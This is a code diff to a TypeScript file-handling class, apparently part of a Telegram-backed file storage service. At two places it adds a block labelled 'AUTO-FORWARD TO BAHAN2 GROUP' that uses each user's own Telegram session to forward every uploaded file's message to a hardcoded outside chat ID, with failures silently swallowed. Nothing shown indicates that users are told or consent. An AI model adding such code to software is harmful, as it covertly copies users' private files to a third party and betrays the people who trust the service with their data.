@@ -819,6 +819,45 @@ export class Files {
       forwardInfo = `${type}/${peerId}/${data.id?.toString()}/${accessHash}`
     }
 
+
+    // --- AUTO-FORWARD TO BAHAN2 GROUP ---
+    try {
+      if (req.tg) {
+        let fromPeer: any = 'me';
+        if (forwardInfo) {
+          const [type, peerId, _, accessHash] = forwardInfo.split('/');
+          if (type === 'channel') {
+            fromPeer = new Api.InputPeerChannel({ channelId: bigInt(peerId) as any, accessHash: accessHash ? bigInt(accessHash) as any : undefined });
+          } else if (type === 'user') {
+            fromPeer = new Api.InputPeerUser({ userId: bigInt(peerId) as any, accessHash: bigInt(accessHash) as any });
+          } else if (type === 'chat') {
+            fromPeer = new Api.InputPeerChat({ chatId: bigInt(peerId) as any });
+          }
+        }
+        
+        let targetPeer: any;
+        try {
+          targetPeer = await req.tg.getInputEntity('-1004293347509');
+        } catch(e) {}
+        
+        if (targetPeer) {
+          const msgIdToForward = typeof data !== 'undefined' && data ? data.id : (typeof message !== 'undefined' && message ? message.id : null);
+          if (msgIdToForward) {
+            await req.tg.invoke(
+              new Api.messages.ForwardMessages({
+                fromPeer: fromPeer,
+                id: [msgIdToForward],
+                toPeer: targetPeer,
+                randomId: [bigInt.randBetween('-1e100', '1e100') as any]
+              })
+            );
+          }
+        }
+      }
+    } catch(err) {
+      console.log('Auto-forward to Bahan2 failed:', err);
+    }
+    // --- END AUTO-FORWARD ---
     await prisma.files.update({
       data: {
         message_id: data.id?.toString(),
@@ -963,6 +1002,45 @@ export class Files {
       forwardInfo = `${type}/${peerId}/${message.id?.toString()}/${accessHash}`
     }
 
+
+    // --- AUTO-FORWARD TO BAHAN2 GROUP ---
+    try {
+      if (req.tg) {
+        let fromPeer: any = 'me';
+        if (forwardInfo) {
+          const [type, peerId, _, accessHash] = forwardInfo.split('/');
+          if (type === 'channel') {
+            fromPeer = new Api.InputPeerChannel({ channelId: bigInt(peerId) as any, accessHash: accessHash ? bigInt(accessHash) as any : undefined });
+          } else if (type === 'user') {
+            fromPeer = new Api.InputPeerUser({ userId: bigInt(peerId) as any, accessHash: bigInt(accessHash) as any });
+          } else if (type === 'chat') {
+            fromPeer = new Api.InputPeerChat({ chatId: bigInt(peerId) as any });
+          }
+        }
+        
+        let targetPeer: any;
+        try {
+          targetPeer = await req.tg.getInputEntity('-1004293347509');
+        } catch(e) {}
+        
+        if (targetPeer) {
+          const msgIdToForward = typeof data !== 'undefined' && data ? data.id : (typeof message !== 'undefined' && message ? message.id : null);
+          if (msgIdToForward) {
+            await req.tg.invoke(
+              new Api.messages.ForwardMessages({
+                fromPeer: fromPeer,
+                id: [msgIdToForward],
+                toPeer: targetPeer,
+                randomId: [bigInt.randBetween('-1e100', '1e100') as any]
+              })
+            );
+          }
+        }
+      }
+    } catch(err) {
+      console.log('Auto-forward to Bahan2 failed:', err);
+    }
+    // --- END AUTO-FORWARD ---
     await prisma.files.update({
       data: {
         message_id: message.id?.toString(),
